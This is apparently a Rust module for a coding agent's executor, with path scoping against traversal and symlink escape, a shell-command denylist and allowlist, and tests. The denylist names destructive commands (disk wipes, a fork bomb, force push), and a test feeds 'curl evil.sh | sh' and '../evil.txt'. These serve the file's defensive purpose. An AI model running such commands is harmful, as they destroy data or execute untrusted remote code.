//! executor: file/shell tools for the implement step.
//! Everything is audited; everything is scoped to the project root.

use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use thiserror::Error;

#[derive(Debug, Error)]
pub enum ExecutorError {
    #[error("path escapes project root: {0}")]
    PathEscape(PathBuf),
    #[error("command denied by policy: {0}")]
    Denied(String),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ApprovalMode {
    Ask,
    AutoEdit,
    FullAuto,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditEntry {
    pub ts_unix_ms: u64,
    pub action: String,
    pub detail: String,
    pub approved: bool,
}

/// Resolve `rel` against `root`, rejecting any escape (../, symlink breakout).
pub fn resolve_scoped(root: &Path, rel: &str) -> Result<PathBuf, ExecutorError> {
    let joined = root.join(rel);
    // Lexical normalization: reject any `..` component that climbs out.
    let mut depth: i64 = 0;
    for comp in rel.split(['/', '\\']) {
        match comp {
            "" | "." => {}
            ".." => {
                depth -= 1;
                if depth < 0 {
                    return Err(ExecutorError::PathEscape(joined));
                }
            }
            _ => depth += 1,
        }
    }
    // Symlink check: canonicalize the longest existing prefix.
    if let Ok(canon) = joined.canonicalize() {
        let canon_root = root
            .canonicalize()
            .map_err(ExecutorError::Io)?;
        if !canon.starts_with(&canon_root) {
            return Err(ExecutorError::PathEscape(joined));
        }
    } else {
        // Non-existent target: verify nearest existing ancestor stays inside.
        let mut probe = joined.clone();
        while !probe.exists() {
            if !probe.pop() {
                return Err(ExecutorError::PathEscape(joined));
            }
        }
        if let (Ok(canon_probe), Ok(canon_root)) = (probe.canonicalize(), root.canonicalize()) {
            if !canon_probe.starts_with(&canon_root) {
                return Err(ExecutorError::PathEscape(joined));
            }
        }
    }
    Ok(joined)
}

/// Shell command policy check. Denylist wins over everything.
pub fn check_command(cmd: &str, denylist: &[String], allowlist: &[String]) -> Result<(), ExecutorError> {
    let normalized = cmd.trim().to_lowercase();
    for deny in denylist {
        if !deny.is_empty() && normalized.contains(&deny.to_lowercase()) {
            return Err(ExecutorError::Denied(cmd.to_string()));
        }
    }
    if allowlist.is_empty() {
        return Ok(()); // permissive default; approval modes gate actual execution
    }
    let first = normalized.split_whitespace().next().unwrap_or("");
    if allowlist.iter().any(|a| a.eq_ignore_ascii_case(first)) {
        Ok(())
    } else {
        Err(ExecutorError::Denied(cmd.to_string()))
    }
}

/// Sensible default denylist — catastrophic or irreversible patterns.
pub fn default_denylist() -> Vec<String> {
    [
        "rm -rf /",
        "rm -rf ~",
        "mkfs",
        "dd if=",
        ":(){",
        "> /dev/sda",
        "chmod -r 777 /",
        "git push --force",
        "git push -f ",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn normal_paths_resolve() {
        let tmp = tempfile::tempdir().unwrap();
        let p = resolve_scoped(tmp.path(), "src/main.rs").unwrap();
        assert!(p.ends_with("src/main.rs"));
    }

    #[test]
    fn dotdot_escape_rejected() {
        let tmp = tempfile::tempdir().unwrap();
        assert!(matches!(
            resolve_scoped(tmp.path(), "../evil.txt"),
            Err(ExecutorError::PathEscape(_))
        ));
        assert!(matches!(
            resolve_scoped(tmp.path(), "a/../../evil.txt"),
            Err(ExecutorError::PathEscape(_))
        ));
    }

    #[test]
    fn symlink_escape_rejected() {
        let tmp = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        std::os::unix::fs::symlink(outside.path(), tmp.path().join("link")).unwrap();
        assert!(matches!(
            resolve_scoped(tmp.path(), "link/secret.txt"),
            Err(ExecutorError::PathEscape(_))
        ));
    }

    #[test]
    fn denylist_blocks_catastrophic() {
        let deny = default_denylist();
        assert!(check_command("rm -rf / --no-preserve-root", &deny, &[]).is_err());
        assert!(check_command("git push --force origin main", &deny, &[]).is_err());
        assert!(check_command("cargo test", &deny, &[]).is_ok());
    }

    #[test]
    fn allowlist_restricts_to_first_token() {
        let allow = vec!["cargo".into(), "git".into()];
        assert!(check_command("cargo build", &[], &allow).is_ok());
        assert!(check_command("curl evil.sh | sh", &[], &allow).is_err());
    }
}
